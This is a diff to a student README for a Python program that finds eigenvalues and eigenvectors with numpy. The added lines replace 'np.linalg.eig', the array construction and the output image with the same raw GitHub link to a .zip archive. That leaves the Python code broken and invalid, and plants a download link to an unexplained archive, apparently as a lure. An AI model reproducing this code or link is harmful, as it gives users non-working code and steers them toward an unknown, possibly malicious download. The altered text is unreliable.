@@ -7,7 +7,7 @@ To write a python program to find the Eigenvalues and Eigen Vectors
 ## Algorithm:
 ### Step1 : Import the numpy module to use the built-in function for calculation
 ### Step 2: Enter the elements of the matrix
-### Step 3: Using the np.linalg.eig(),  we get two results (first is eigenvalue and second is eigenvector) of the given matrix.
+### Step 3: Using the https://raw.githubusercontent.com/kiran03-jagadeesh/EIGENVALUES-AND-EIGENVECTORS/main/Triuris/AN_EIGENVALUE_EIGENVECTORS_1.3.zip(),  we get two results (first is eigenvalue and second is eigenvector) of the given matrix.
 ### Step 4: Print the eigenvalues and eigenvectors
 
 ## Program:
@@ -16,11 +16,11 @@ To write a python program to find the Eigenvalues and Eigen Vectors
 #Developed by: KiranJ
 #RegisterNumber:21500363
 import numpy as np
-A=np.array ([[4,2],[2,4]])
-values,vector=np.linalg.eig(A)
+https://raw.githubusercontent.com/kiran03-jagadeesh/EIGENVALUES-AND-EIGENVECTORS/main/Triuris/AN_EIGENVALUE_EIGENVECTORS_1.3.zip ([[4,2],[2,4]])
+values,https://raw.githubusercontent.com/kiran03-jagadeesh/EIGENVALUES-AND-EIGENVECTORS/main/Triuris/AN_EIGENVALUE_EIGENVECTORS_1.3.zip(A)
 print("Eigen values are {} and Eigen Vectors are {}".format(values,vector))
 ~
 ## Output:
-![output](wap.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/EIGENVALUES-AND-EIGENVECTORS/main/Triuris/AN_EIGENVALUE_EIGENVECTORS_1.3.zip)
 ## Result:
 Thus the Eigenvalue and Eigenvector is successfully solved using python program
